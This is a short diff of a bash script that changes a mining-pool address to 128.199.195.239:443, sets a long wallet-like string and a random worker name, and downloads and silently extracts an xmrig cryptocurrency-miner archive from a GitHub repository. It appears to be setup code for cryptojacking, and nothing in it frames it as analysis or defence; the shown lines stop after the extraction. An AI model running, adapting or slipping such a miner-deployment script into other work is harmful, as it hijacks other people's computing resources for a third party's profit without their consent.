@@ -1,5 +1,5 @@
 #!/bin/bash
-A=157.230.255.104:443
+A=128.199.195.239:443
 B=SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC
 C=$(echo $(shuf -i 1-200 -n 1)-SUIII)
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
